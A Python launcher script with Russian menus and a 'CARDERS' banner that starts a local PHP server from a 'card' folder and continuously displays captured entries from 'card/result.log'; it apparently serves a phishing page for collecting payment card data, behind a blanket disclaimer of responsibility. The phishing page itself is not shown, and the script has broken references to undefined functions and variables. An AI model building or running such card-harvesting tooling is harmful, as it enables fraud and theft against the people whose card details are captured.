import os, sys, time
from progress.bar import IncrementalBar
from multiprocessing import Process
from time import sleep
from termcolor import colored
import subprocess

os.system('clear')

def A(count=10,sleep_time=0.5):
    sleep_time=0.5
    count=10
    if True:
        subprocess.Popen("cd card && php -S localhost:"+str(ports) , shell = True)
    else:
        print("No number '"+used+"'")

def B(count=10, sleep_time=0.5):
    os.system("rm card/result.log > /dev/null 2>&1")
    while True:
        s = os.system("tail -n 4 card/result.log  > /dev/null 2>&1")
        if s == 0:
            os.system("tail -n 4 card/result.log")
        else:
            print("Данных не поступило")
        time.sleep(1)
        os.system("clear")

def Card():
    global ports

    bar = IncrementalBar('Загрузка...', max = 14)

    for item in range(14):
        bar.next()
        time.sleep(0.1)

    bar.finish()

    ports = input("[Порт]: ")

    if ports == "":
        ports=8080
    if __name__ == '__main__':
        A()
        B()

        p1 = Process(target=a, kwargs={'sleep_time': 0.7})
        p2 = Process(target=b, args=(12,))
        p1.start()
        p2.start()

        p1.join()
        p2.join()

def batya():
    print("""
Разработчики: @batyarimskiy,@awequr
Связь через Telegram (TG)

Для выхода в меню нажмите Enter: """)
    input()
    main()

def main():
    num_menu = ''
    print(dis)
    if dis == "n":
       os.system('clear')
       print("Ну и правильно! Прощай...")
       print()
       sys.exit()
    elif dis == "N":
        os.system('clear')
        print("Ну и правильно! Прощай...")
        print()
        sys.exit()
    os.system('clear')
    print(banner)
    while len(num_menu) == 0:
        print(menu)
        num_menu = input(">> ")
    if num_menu == "1":
        Card()
    if num_menu == "2":
        batya()
    if num_menu == "3":
        sys.exit()

dis = input("""
\033[37m\033[31mВНИМАНИЕ!\nПОЛНЫЙ ОТКАЗ ОТ ОТВЕТСТВЕНОСТИ!\nСКРИПТ ПРЕДОСТАВЛЕН В ОЗНАКОМИТЕЛЬНЫХ ЦЕЛЯХ!\nВСЕ ДЕЙСТВИЯ НА ВАШ СТРАХ И РИСК!\033[0m

Вы готовы условия соглашения? (y/N): """)

banner = colored("""
 ▄████▄   ▄▄▄       ██▀███  ▓█████▄ ▓█████  ██▀███    ██████
▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒▒██    ▒
▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒███   ▓██ ░▄█ ▒░ ▓██▄
▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒
▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░▒████▒░██▓ ▒██▒▒██████▒▒
░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░
  ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░
░          ░   ▒     ░░   ░  ░ ░  ░    ░     ░░   ░ ░  ░  ░
░ ░            ░  ░   ░        ░       ░  ░   ░           ░
░                            ░
""", "red")
menu = """
[1] Карточки
[2] Разработчики
[3] Выход
"""

main()
